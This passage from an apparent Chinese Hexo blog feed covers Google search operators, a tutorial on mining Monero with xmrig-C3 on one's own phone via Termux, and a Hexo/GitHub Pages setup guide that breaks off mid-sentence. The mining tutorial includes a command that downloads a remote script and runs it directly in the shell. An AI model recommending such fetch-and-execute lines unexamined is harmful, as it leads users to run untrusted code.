title="allintext:"></a>allintext:</h2><p>当我们用allintext提交查询的时候，Google会限制搜索结果仅仅是在网页正文里边包含了我们所有查询关键词的网页。</p><p>例如：“allintext: travel packing list”，提交这个查询，Google仅仅会返回在一个网页包含了三个关键词“travel”、“packing”和“list”的网页。</p><hr><h2 id="allintitle"><a href="#allintitle" class="headerlink" title="allintitle:"></a>allintitle:</h2><p>allintitle:搜索返回的是页面标题中包含多组关键词的文件，当我们用allintitle提交查询的时候，Google会限制搜索结果仅是那些在网页标题里边包含了我们所有查询关键词的网页。</p><p>例如：“allintitle: detect plagiarism”，提交这个查询，Google仅会返回在网页标题里边包含了“detect”和“plagiarism”这两个关键词的网页。</p><p>而intitle:SEO intitle:搜索引擎优化返回的是标题中既包含“SEO”，也包含“搜索引擎优化”的页面。</p><hr><h2 id="allinurl"><a href="#allinurl" class="headerlink" title="allinurl:"></a>allinurl:</h2><p>与allintitle:类似，allinurl:SEO搜索引擎优化就相当于inurl:SEO inurl:搜索引擎优化。</p><p>当我们用allinurl提交查询的时候，Google会限制搜索结果仅是那些在URL（网址）里边包含了我们所有查询关键词的网页。</p><p>例如：“allinurl: mahaixiang SEO”，提交这个查询，Google仅会返回在URL里边包含了关键词“mahaixiang”和“SEO”的网页，像www.15d.cc/seo/index.html等的网页。</p><hr><h2 id="author"><a href="#author" class="headerlink" title="author:"></a>author:</h2><p>当我们用author进行查询的时候，Google会限制返回结果仅仅是那些在Google论坛里边，包含了特定作者的新闻文章，在这里，作者名可以是全名，也可以是一部分或邮件地址。</p><p>例如：“泠鸢yousa author:梦璃雨落”返回结果将是作者梦璃雨落写的，关于包含关键词泠鸢yousa的文章。</p><hr><h2 id="cache"><a href="#cache" class="headerlink" title="cache:"></a>cache:</h2><p>提交cache:url，Google会显示当前网页的快照信息，从而替换网页的当前信息。</p><p>例如：“ysbrid.top”，提交这个查询，Google会返回所有抓取的关于url的网页快照信息，在显示的网页快照信息里边，Google会高亮显示查询关键词（在cache:和URL之间不能有空格）。</p><hr><h2 id="datarange"><a href="#datarange" class="headerlink" title="datarange:"></a>datarange:</h2><p>当我们使用datarange进行查询的时候，Google会将查询结果限制在一个特定的时间段内，这个时间相对于网站来说，是按网站被google收录的时间算的。</p><p>例如：“Geri Halliwell” “Spice Girls” daterange:2450958-2450968，这里的时间日期格式是按天文学的儒略日（这个搜索语法Google并不推荐使用，因为它会返回一些莫名其妙的东西）。</p><hr><h2 id="define"><a href="#define" class="headerlink" title="define:"></a>define:</h2><p>当我们用define进行查询的时候，Google会返回包含查询关键词定义的网面。</p><p>例如：“define: blog”，这个查询将会返回Blog的定义。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用手机+termux实现挖矿</title>
      <link href="/post/termux-xmr/"/>
      <url>/post/termux-xmr/</url>
      
        <content type="html"><![CDATA[<details class="folding-tag" red><summary> 查看参考教程 </summary>              <div class='content'>              <div class="site-card-group"><a class="site-card" href="https://xn--8qvt52h.top/teach/313.html"><div class="img"><img src="https://www.helloimg.com/images/2022/02/05/GKsL8A.md.jpg"/></div><div class="info"><img src="https://gitee.com/hshx123/picplus/raw/master/1595119088132.png"/><span class="title">闲的没事？用手机termux挖矿吧</span><span class="desc">参考了部分教程使用</span></div></a></div>              </div>            </details><div class="note red icon flat"><i class="note-icon fas fa-fan"></i><p>用手机挖矿，感觉本末倒置了诶~</p></div><hr><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><ol><li><p>高级终端Termux，可以到官方<a href="https://f-droid.org/packages/com.termux/">下载地址</a>下载。</p></li><li><p>XMR钱包账号，下文会介绍申请</p></li></ol><hr><h2 id="安装发行版Ubuntu"><a href="#安装发行版Ubuntu" class="headerlink" title="安装发行版Ubuntu"></a>安装发行版Ubuntu</h2><ul><li>Termux内输入并回车</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">. &lt;(curl -L gitee.com/mo2/linux/raw/2/2)</span><br></pre></td></tr></table></figure><ul><li>执行结束后会弹出这样一个界面</li></ul><h3 id="选择中文简体，给予权限"><a href="#选择中文简体，给予权限" class="headerlink" title="选择中文简体，给予权限"></a>选择中文简体，给予权限</h3><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-1.webp" alt="选择语言"></p><hr><ul><li>然后会进入图示界面</li></ul><blockquote><p>建议先更新一下<br>选择<emp>更新</emp>，然后一路回车即可</p></blockquote><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-1.webp" alt="工具主页"></p><hr><h3 id="选择第一个proot容器（如果有root权限可以使用第二个）"><a href="#选择第一个proot容器（如果有root权限可以使用第二个）" class="headerlink" title="选择第一个proot容器（如果有root权限可以使用第二个）"></a>选择第一个<strong>proot容器</strong>（如果有root权限可以使用第二个）</h3><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-2.webp" alt="工具主页"></p><hr><h3 id="然后选择第一个：arm发行列表"><a href="#然后选择第一个：arm发行列表" class="headerlink" title="然后选择第一个：arm发行列表"></a>然后选择第一个：arm发行列表</h3><blockquote><p>因为现在的手机CPU都是arm架构的，如果跨CPU的还有折损</p></blockquote><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-3.webp" alt="proot容器"></p><hr><h3 id="选择Ubuntu-其实其他版本也差不多"><a href="#选择Ubuntu-其实其他版本也差不多" class="headerlink" title="选择Ubuntu(其实其他版本也差不多)"></a>选择Ubuntu(其实其他版本也差不多)</h3><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-4.webp" alt="arm发行版"></p><hr><h3 id="选择版本"><a href="#选择版本" class="headerlink" title="选择版本"></a>选择版本</h3><ul><li>随便选一个即可，但建议选LTS(长期维护)</li></ul><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-5.webp" alt="Ubuntu"></p><ul><li>终端配色，小键盘和一言看个人喜好，dns，时区默认就行</li></ul><p>创建sudo用户选择“NO”<br>接下来按照图片中的选（如果有自己需求的可以自行选择）<br><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-7.webp" alt="sudo"></p><ul><li>zsh终端美化</li></ul><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-8.webp" alt="zsh"></p><ul><li>安装后删除安装文件</li></ul><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-9.webp" alt="delete"></p><ul><li>读取头像</li></ul><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-10.webp" alt="头像"></p><ul><li>启动工具</li></ul><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-11.webp" alt="启动工具"></p><hr><h3 id="接下来一路回车就行"><a href="#接下来一路回车就行" class="headerlink" title="接下来一路回车就行"></a>接下来一路回车就行</h3><ul><li>安装过程需要很久，请等待！</li></ul><p>等安装完会弹出下面的界面了</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-12.webp" alt="工具(2)主页"></p><hr><h3 id="选择退出"><a href="#选择退出" class="headerlink" title="选择退出"></a>选择退出</h3><p><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-12.webp" alt="工具(2)主页"></p><blockquote><p>安装完成会自动进入tmoe工具<br><img src="https://img.dreamfall.cn/post/termux-xmr/Ubuntu-13.webp" alt="完成"></p></blockquote><hr><h2 id="申请挖矿钱包-XMR"><a href="#申请挖矿钱包-XMR" class="headerlink" title="申请挖矿钱包(XMR)"></a>申请挖矿钱包(XMR)</h2><blockquote><p>两种申请方法，一种为在线钱包，在线申请，安全度较低。<br>另一种为本地钱包，需要电脑，安全度较高。</p></blockquote><ul><li>这里以在线钱包为例子</li></ul><h3 id="进入网站"><a href="#进入网站" class="headerlink" title="进入网站"></a>进入网站</h3><p>进入官方钱包申请地址: <a href="https://wallet.mymonero.com">https://wallet.mymonero.com</a><br>进入选择“Create new wallet”</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/zc-1.webp" alt="xmr注册"></p><h3 id="获取密码"><a href="#获取密码" class="headerlink" title="获取密码"></a>获取密码</h3><p>勾上“GOT IT!”点击右上角的<emp>“NEXT”</emp></p><p>接下来会出现一段中文，如图</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/zc-2.webp" alt="xmr密码"></p><ul><li>这段中文就是你钱包的登陆密码！请妥善保存</li><li>丢失后<emp>无法找回</emp></li></ul><h3 id="校验密码"><a href="#校验密码" class="headerlink" title="校验密码"></a>校验密码</h3><p>保存好后点击“<em>NEXT</em>”，现在你需要输入刚才密码的前几个字，输入成功即可创建你的钱包</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/zc-3.webp" alt="xmr注册"></p><h3 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h3><p><strong>Address(钱包地址)</strong>就是之后挖矿要用的收款地址</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/zc-4.webp" alt="xmr注册"></p><h2 id="自行编译C3-xmrig"><a href="#自行编译C3-xmrig" class="headerlink" title="自行编译C3-xmrig"></a>自行编译C3-xmrig</h2><blockquote><p>由于安装的ubuntu是arm架构，但C3-xmrig并未提供aarch64的二进制版本，所以需要手动编译</p></blockquote><h3 id="进入Ubuntu"><a href="#进入Ubuntu" class="headerlink" title="进入Ubuntu"></a>进入Ubuntu</h3><p>打开termux终端<br>输入下面命令启动Ubuntu</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">debian</span><br></pre></td></tr></table></figure><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><p>进入系统后输入</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y</span><br></pre></td></tr></table></figure><p>这些软件包是之后编译必备的，如果不安装可能会报错</p><h3 id="克隆代码"><a href="#克隆代码" class="headerlink" title="克隆代码"></a>克隆代码</h3><blockquote><p>此处使用C3pool提供的代码(效果: 在CPU和GPU上进高收益币种自动切换（Nvidia，AMD）)</p></blockquote><a class="ghcard" rel="external nofollow noopener noreferrer" href="https://github.com/C3Pool/xmrig-C3"><img src="https://github-readme-stats.vercel.app/api/pin/?username=C3Pool&repo=xmrig-C3&show_owner=true"/></a><p>在终端输入</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/C3Pool/xmrig-C3.git</span><br></pre></td></tr></table></figure><p><img src="https://img.dreamfall.cn/post/termux-xmr/xmr-1.webp" alt="git"></p><h3 id="去除抽水率"><a href="#去除抽水率" class="headerlink" title="去除抽水率"></a>去除抽水率</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 这里使用vim编辑器，具体使用方法自行百度</span></span><br><span class="line">vim xmrig-C3/src/donate.h</span><br></pre></td></tr></table></figure><p>然后修改</p><figure class="highlight d"><table><tr><td class="code"><pre><span class="line">constexpr <span class="keyword">const</span> <span class="keyword">int</span> kDefaultDonateLevel = <span class="number">1</span></span><br><span class="line">constexpr <span class="keyword">const</span> <span class="keyword">int</span> kMinimumDonateLevel = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>把“1”改成“0”</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/xmr-2.webp" alt="捐助"></p><h3 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h3><p>在终端输入</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> xmrig-C3/build &amp;&amp; <span class="built_in">cd</span> xmrig-C3/build &amp;&amp; cmake .. &amp;&amp; make -j$(<span class="built_in">nproc</span>) &amp;&amp; <span class="built_in">mv</span> xmrig ~ &amp;&amp; <span class="built_in">cd</span> ~ &amp;&amp; <span class="built_in">rm</span> -rf xmrig-C3</span><br></pre></td></tr></table></figure><p>大约3分钟</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><blockquote><p>根据 @RDReindeer提醒！使用cn-pico算法效率好一些！所以指定算法 -a cn-pico</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./xmrig -u 你的钱包地址 -o  auto.c3pool.org:19999 -p termux -a cn-pico</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./xmrig -u 47piFPRJjKdbN1cQb5YmHDJL7ykAtabwi6jbE4wAfyvC4MA2gq9L4Jt8TUT88aE2JB2PTF1So1EEW6Mt6WnyMjExH838eqG -o auto.c3pool.org:19999 -p termux -a cn-pico</span><br></pre></td></tr></table></figure><p>然后…你的手机就会开始起飞！</p><p><img src="https://img.dreamfall.cn/post/termux-xmr/xmr-3.webp" alt="xmr注册"></p><p><strong>停止</strong>: 按〈CTRL〉键后输入c 回车</p><h2 id="查看算力"><a href="#查看算力" class="headerlink" title="查看算力"></a>查看算力</h2><p>进入<a href="https://c3pool.com">start map</a>，在右上角输入钱包地址即可<br>注意: 运行几分钟后才能看到数据</p><h2 id="第二次运行"><a href="#第二次运行" class="headerlink" title="第二次运行"></a>第二次运行</h2><p>进入Ubuntu</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">debian</span><br></pre></td></tr></table></figure><p>和上面一样，输入指令</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./xmrig -u 钱包地址 -o mine.c3pool.com:13333 -p termux -a cn-pico</span><br></pre></td></tr></table></figure><p>教程到这就结束了，本教程仅供参考，手机的挖矿效率非常低，不建议使用。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> Termux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> termux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于我HEXO博客的搭建</title>
      <link href="/post/hexo/"/>
      <url>/post/hexo/</url>
      
        <content type="html"><![CDATA[<blockquote><p>我现在使用主题为 Butterfly <code>4.1.0</code>版本，<br>框架为HEXO <code>5.4.1</code>版本</p></blockquote><ul><li>请按照以下步骤依次安装相应依赖和框架</li></ul><h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><blockquote><p><strong>什么是 Node.js ？</strong><br>这得从什么是 JS 说起，JS 也就是 JavaScript。（为什么有种从盘古开天辟地开始的感觉）没错，JavaScript 就是网页的盘古。JavaScript 是一种编程语言，我们所见到的网页中的交互和逻辑处理几乎都是由 JavaScript 完成。<br>JavaScript 语法简单，易学易用。（当然也请不要小瞧它，虽然它入门门槛低，但上限同样也很高。包括但不限于实现网站前后端，手机桌面应用程序，机器学习，计算机图形学等。）<br>在 Node.js 诞生前，JavaScript 都运行于浏览器端。也就是说，它是鱼，浏览器是装满了水的水缸。<br>2008 年，Chrome V8 诞生。2009 年，Node.js 诞生。并成为 GitHub 早期最著名的开源项目。GitHub 可能大家已有所了解，后续再说。<br>Node.js 便是一个基于 Chrome V8 引擎的 JavaScript 运行环境。（当年第一次看到这句话时，我也一脸懵逼。）按照我的理解，JavaScript 是鱼，Chrome V8 就是抽水机，Node.js 则把这台抽水机也装在你电脑上。于是你的电脑也有了 Node.js 这个和浏览器相似的水缸，也可以在里面运行 JavaScript 了！<br>当然 Node.js 和浏览器端还是因为自身定位和一些历史原因而有些许区别的，不再展开。<br><a href="https://baike.baidu.com/item/node.js/7567977">Node.js | 百度百科</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript">JavaScript | MDN</a></p></blockquote><p><a href="https://nodejs.org/zh-cn/">下载 ｜Node.js</a></p><p>建议下载<strong>长期支持版</strong>而非当前发布版（因为如果是最新版，容易出现一些奇妙的 bug）。</p><ul><li><p>推荐使用12.X版本</p></li><li><p>全部默认下一步进行安装。</p></li></ul><p>Windows 打开命令提示符（cmd），或者powershell，macOS 打开终端。（= =，这个不会就请百度吧。）<br>Linux 用户右上角关闭本标签页。</p><blockquote><p>后续如提到输入命令，均默认指打开终端进行输入。</p></blockquote><p>输入 node -v，如果提示版本号，那么 Node.js 就已经成功安装。</p><blockquote><p>Node.js 安装成功时也默认安装了 <code>npm</code>，在此后将会用到。<br><code>npm</code> 是随 Node.js 一起被安装的包管理工具，你可以理解成 Node.js 自带的应用商店。</p></blockquote><p>对了，国内使用 npm 可能很慢。</p><p>你可以考虑切换为 <code>taobao</code> 镜像源。（推荐）</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><p>或者使用阿里云的<a href="https://cnpmjs.org/">cnpm</a></p><h2 id="Git-与-GitHub"><a href="#Git-与-GitHub" class="headerlink" title="Git 与 GitHub"></a>Git 与 GitHub</h2><h3 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h3><blockquote><p>Visual Studio Code，简称 VS Code。<br>目前最为强大易用的编辑器，轻量且快速。（<del>宇宙第一编辑器</del>）<br>注意：它并不是我们常常听到的 VS，VS 常常指的是 Visual Studio，是一个功能强大的 IDE（集成开发环境），体积也相比 VS Code 都要大上一个量级。</p></blockquote><p>在此之前，我建议你先安装 <a href="https://code.visualstudio.com/">VS Code</a>。因为安装 Git Bash 时，可以设置 VS Code 作为默认编辑器。</p><blockquote><p>Git 是一个开源的分布式版本控制系统，由 Linus Torvalds（同时也是 Linux 的作者）为了管理 Linux 开发而开发。<br>简而言之，是一个版本管理工具。譬如设计师设计好了第三版的海报，客户却说还是要第一版吧，这时便可以通过 Git 快速回退到最初的版本。<br>你只需要把每次更改的状态（Git 会自动进行检测，你只要掌握基础的几条命令就可以了）告诉 Git，而不需要每个版本都保存一份压缩包，既方便也能大大节约空间。<br>（当然这主要只对代码文本起作用，因为 Git 的本质是记录各行代码的增减，倘若是像视频、海报这类二进制文件来说便体现不出丝毫优势了。当然想要应对这种场景还有 <a href="https://git-lfs.github.com/">Git LFS</a>。）</p></blockquote><p>下载 <a href="https://git-scm.com/">Git</a> 并安装</p><p>macOS 用户可以下载官网的安装包进行安装，也可以直接安装 App Store 的 Xcode（附带会安装 Git，但是比较大）。</p><blockquote><p>类似的工具还有：SVN。但始终更推荐 Git，因为它功能更为强大且它的背后还有更强大的生态：GitHub。</p></blockquote><h3 id="注册-GitHub"><a href="#注册-GitHub" class="headerlink" title="注册 GitHub"></a>注册 GitHub</h3><p>这一部分内容，你也可以放到本地调试并预览成功后并打算线上部署的时候，再回过头来看。</p><blockquote><p>GitHub 一听便与 Git 有所渊源。<code>Git</code> 在英文中是懒人、饭桶之意。<code>Hub</code> 则是中心、集线器的意思。譬如 USB 集线器就是 USB Hub。所以 GitHub 就是饭桶中心（<del>大雾</del>）。<br>GitHub 是全世界最大的开源项目与代码托管平台，也是众多开发者的交流场所。<del>还是全球最大的同性交友网站</del>。<br>而代码托管本身用到的正是上文提到的 Git 技术。</p></blockquote><ul><li>注册 <a href="https://github.com/">GitHub</a> 账号。（推荐使用Gmail注册）</li></ul><p>（虽然都是英文，但不必畏惧，也并不会造成使用障碍，只要记得最常用的选项含义即可，以及善用手头的翻译软件。）</p><blockquote><p>注意：注册时的英文用户名将成为你可以使用的免费域名前缀。</p></blockquote><ul><li>登录 GitHub。</li></ul><blockquote><p>为什么要用 GitHub？<br>对于平民玩家来说，在初次尝试建立自己的网站时，也许并不会有闲钱或者说决心来购买自己的服务器与域名。<br>而 GitHub 则提供了 <a href="https://img.dreamfall.cn/post/hexo/github1.webp">GitHub Pages</a> 这一服务。<br>用户们可以利用这一服务，部署自己的静态站点。</p></blockquote><ul><li>点击右上角的 <code>头像</code> -&gt; <code>Your repositories</code> 进入仓库页。</li></ul><p><img src="https://img.dreamfall.cn/post/hexo/github1.webp" alt="进入仓库"></p><p>点击 <code>New</code></p><p><img src="https://img.dreamfall.cn/post/hexo/github2.webp" alt="仓库页"></p><p>仓库名称务必为 <code>你的用户名.github.io</code>，用户名是英文，大小写无所谓，但建议统一小写。（因为你会发现时常切换大小写很麻烦）</p><p><img src="https://img.dreamfall.cn/post/hexo/github3.webp" alt="新建仓库"></p><blockquote><p>为什么必须这个作为仓库名？<br>GitHub Pages 服务的命名规范，同时若您没有自己的域名，使用 Github 提供的服务的话，请务必将此仓库设为公开，同时它也将成为你的专属域名。当然，你也可以购置自己的专属域名并用它来提供内容。</p></blockquote><ul><li>点击 <code>Create repository</code>。</li></ul><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><h3 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h3><blockquote><p><a href="https://hexo.io">Hexo</a></p></blockquote><ul><li>GitHub: <a href="https://github.com/hexojs/hexo">https://github.com/hexojs/hexo</a></li><li><a href="https://hexo.io/zh-cn/docs/index.html">官方文档</a>（直接参考文档也是一个不错的选择）</li></ul><blockquote><p><strong>为什么使用 Hexo ？</strong><br>Hexo 是一个快速、简洁而强大的博客框架，基于 Node.js，同样托管于 GitHub 之上。生态中拥有众多插件主题。你可以基于它快速生成一些静态页面。<br>你可以使用别人的各种主题与插件，也可以自己定制开发想要的功能。<br><strong>为什么不是别的框架?</strong><br>其他常用的博客框架还有 <a href="https://wordpress.org/">WordPress</a>，<a href="https://typecho.org/">Typecho</a>，<a href="https://ghost.org/">Ghost</a> 等，但这些往往都需要购置自己的服务器，而无法静态化地部署到 GitHub Pages 上。（当然，相应的功能和灵活性也大大提升。）静态化站点还有一个优势就是访问速度往往更快。<br>静态网站生成器还有 <a href="https://vuepress.vuejs.org/">Vuepress</a>，<a href="https://www.gatsbyjs.org/">Gatsby</a> 等。但这些多是为了写文档而量身定制的，你也可以使用它们，但是相较 Hexo 的博客定位，它们关于博客的插件和主题以及解决办法会少得多。<br>Hexo 提供的功能与 <a href="https://gohugo.io/">Hugo</a> 几乎都有，（生成大量文件时，甚至比 Hexo 更快）不过它是基于 GO 语言。日后你想对自己的网站进行自定义，即便是 Hugo，你编写前端的交互仍旧需要使用 JavaScript，所以选择基于 JavaScript 的 Hexo 可以降低学习成本。（你若对 GO 有兴趣，仍然可以尝试使用 Hugo，但本教程将不会针对 Hugo 进行展开。）<br>所以对于新手来说，使用 Hexo 作为起始点，不失为一个好选择。（当然如果你有钱租服务器，并希望快速上手的话，就可以考虑考虑 WordPress 或者 Typecho）</p></blockquote><ul><li>在终端中输入以下命令：</li></ul><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果安装失败，可能是没有权限，可以尝试头部加上 sudo 重新执行（Linux）</span></span><br><span class="line">sudo npm install hexo-cli -g</span><br><span class="line"><span class="comment">#如果是Windows系统的请使管理员权限运行终端（理论上不用）</span></span><br></pre></td></tr></table></figure><blockquote><p><code>install</code> 自然是安装。<br><code>hexo-cli</code> 则是 <code>hexo</code> 的终端工具，可以帮助你生成一些模版文件，之后再用到。<br><code>-g</code> 代表的是全局安装。也就是在任何地方都可以使用，否则会只能在安装的目录下使用。</p></blockquote><h3 id="选择目录"><a href="#选择目录" class="headerlink" title="选择目录"></a>选择目录</h3><p>此时，请先通过 <code>cd</code> 进入你本地电脑打算存储网站代码的文件夹目录。（或者右键文件夹 Git Bash Here）</p><blockquote><p><a href="https://baike.baidu.com/item/cd/3516393">cd | DOS 命令</a><br><a href="https://baike.baidu.com/item/cd/3516411">cd （LINUXSHELL 命令）</a></p></blockquote><p>譬如：</p><blockquote><p>注意：这里是你自定义的目录，请不要复制粘贴</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># &#x27;#&#x27; 字符后的文字代表注释，不需要输入</span></span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line"><span class="built_in">cd</span> C:\Users\CCKNBC\Documents\GitHub\</span><br><span class="line"><span class="comment">#实际上我用的是D:blog目录,按需选择即可</span></span><br><span class="line"><span class="comment"># macOS</span></span><br><span class="line"><span class="built_in">cd</span> /Users/yunyou/github/</span><br></pre></td></tr></table></figure><h3 id="创建博客"><a href="#创建博客" class="headerlink" title="创建博客"></a>创建博客</h3><p>接下来输入：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init 你想建立的文件夹名</span><br><span class="line"><span class="comment">#例如 hexo init blog</span></span><br></pre></td></tr></table></figure><blockquote><p><code>hexo</code> 正是因为我们之前安装了 <code>hexo-cli</code> 这一个包，所以我们可以在终端中使用 <code>hexo</code> 这一命令。<br><code>init</code> 初始化博客的模版文件。后面跟的是你要新建的文件夹，最好和你此前新建的仓库名一致（防止记错）。</p></blockquote><h3 id="安装依赖"><a href="#安装依赖" class="headerlink" title="安装依赖"></a>安装依赖</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 进入你的博客文件夹</span></span><br><span class="line"><span class="built_in">cd</span> 上一步新建的名字 <span class="comment"># 例如 cd blogs</span></span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><h3 id="生成文件"><a href="#生成文件" class="headerlink" title="生成文件"></a>生成文件</h3><p>下面命令也可以缩写成 <code>hexo g</code> <code>hexo s</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure><p><code>server</code> 代表开启本地的 Hexo 服务器，这时你就可以打开浏览器，在地址栏中输入 <code>localhost:4000</code> 就可以看到本地的网页了。</p><p>按 <code>Ctrl + C</code> 中断服务器的运行。</p><p>至此，基础的模版页面便已经搭建好了。</p><h2 id="主题安裝（教程以butterfly主题为例子）"><a href="#主题安裝（教程以butterfly主题为例子）" class="headerlink" title="主题安裝（教程以butterfly主题为例子）"></a>主题安裝（教程以butterfly主题为例子）</h2><h3 id="使用-Hexo-主题"><a href="#使用-Hexo-主题" class="headerlink" title="使用 Hexo 主题"></a>使用 Hexo 主题</h3><p>Hexo 默认提供的是 <a href="https://github.com/hexojs/hexo-theme-landscape">hexo-theme-landscape</a> 主题。<br>默认主题样式简单，功能较少。所以大多数人并不会使用默认主题。</p><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">npm 安装（推荐）</button></li><li class="tab"><button type="button" data-href="#test1-2">Git 安装</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><blockquote><p>此方法只支持<code>Hexo 5.0.0</code>以上版本</p></blockquote><p>在博客根目录里</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i hexo-theme-butterfly</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p>在博客根目录里安装稳定版<code>master</code>分支【推荐】</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>如果想要安装比较新的<code>dev</code>分支（开发版），可以</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b dev https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="应用主题"><a href="#应用主题" class="headerlink" title="应用主题"></a>应用主题</h3><p>修改 hexo 根目录的配置文件<code>_config.yml</code>，把主题改为<code>Butterfly</code>（注意配置要和你的主题文件夹名大小写完全一致哦）</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span></span><br></pre></td></tr></table></figure><blockquote><p>如果你沒有<code>pug</code>以及<code>stylus</code>的渲染器，请下载安装：（第一次安装的话肯定没有）</p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><blockquote><p>在进行配置修改之前，为了以后主题通过 git pull 平滑升级，请不要随意改动主题源码我们通常在 Hexo 根目录/<strong><code>themes/butterfly/</code></strong>下把主题的 <strong><code>_config.yml</code></strong>复制到HEXO根目录，并且重命名为 <strong><code>_config.butterfly.yml</code></strong>，然后再对 _config_butterfly.yml 进行修改即可</p></blockquote><p>有了上面的基础，我们就可以根据对应的<a href="https://hexo.io/zh-cn/docs/"><strong>文档</strong></a>修改相应的配置了,以下不再赘述</p><h2 id="生成静态文件"><a href="#生成静态文件" class="headerlink" title="生成静态文件"></a>生成静态文件</h2><p>至今我们的工作都是在本地进行，想必你也很想放到线上与小伙伴们分享。<br>这便轮到了 GitHub Pages 的出场，不过 GitHub Pages 只支持纯静态文件。</p><p>所以我们需要使用以下命令先来生成站点的静态文件。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 如果进行多次生成，为了避免受错误缓存影响，最好使用 hexo clean 先清除一遍。</span></span><br><span class="line">hexo generate</span><br><span class="line"><span class="comment"># 上面命令可以缩写为 hexo g</span></span><br></pre></td></tr></table></figure><p>此时你的HEXO根目录下会出现 <code>public</code> 这个文件夹，里面存放的就是你站点的静态文件。</p><h2 id="与远程仓库建立关联"><a href="#与远程仓库建立关联" class="headerlink" title="与远程仓库建立关联"></a>与远程仓库建立关联</h2><p>接下来我们将本地的仓库与此前在 GitHub 上建立的仓库建立关联。</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line"><span class="comment"># 初始化 Git 仓库，只需要执行一次即可</span></span><br></pre></td></tr></table></figure><p>在将其部署到 GitHub Pages 上之前，我们最好先建立一个分支。</p><blockquote><p>什么是分支？<br>Git 